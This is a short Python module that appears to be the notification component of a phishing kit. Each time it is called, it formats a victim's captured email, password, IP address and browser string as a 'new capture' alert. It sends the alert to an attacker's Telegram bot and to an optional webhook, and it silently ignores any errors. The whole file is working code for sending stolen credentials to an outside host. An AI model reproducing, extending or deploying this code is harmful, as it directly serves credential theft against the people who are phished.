import json, urllib.request, config

def _post(url, payload):
    try:
        req = urllib.request.Request(
            url, data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

def notify(email, password, ip, ua):
    text = (f"🔐 *{config.SITE_NAME}* — new capture\n"
            f"👤 `{email}`\n🔑 `{password}`\n🌐 `{ip}`\n🖥 `{ua[:80]}`")
    if config.TG_TOKEN and config.TG_CHAT_ID:
        try:
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{config.TG_TOKEN}/sendMessage",
                data=json.dumps({"chat_id": config.TG_CHAT_ID,
                                 "text": text, "parse_mode": "Markdown"}).encode(),
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
    if config.WEBHOOK_URL:
        _post(config.WEBHOOK_URL, {"email": email, "password": password,
                                   "ip": ip, "ua": ua, "site": config.SITE_NAME})
